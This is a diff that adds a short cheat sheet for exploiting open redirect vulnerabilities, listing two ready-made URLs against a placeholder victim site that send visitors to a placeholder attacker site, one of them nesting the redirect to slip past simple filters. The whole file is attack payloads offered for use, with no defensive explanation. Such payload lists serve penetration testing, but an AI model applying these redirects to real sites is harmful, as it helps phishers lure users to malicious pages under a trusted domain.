@@ -1,0 +1,5 @@
+CheatSheet for open redirect vuln:
+
+http://victim.com/redirect.php?uri=https://<attackersite>
+
+http://victim.com/redirect.php?uri=/redirect.php?uri=//<attackersite>
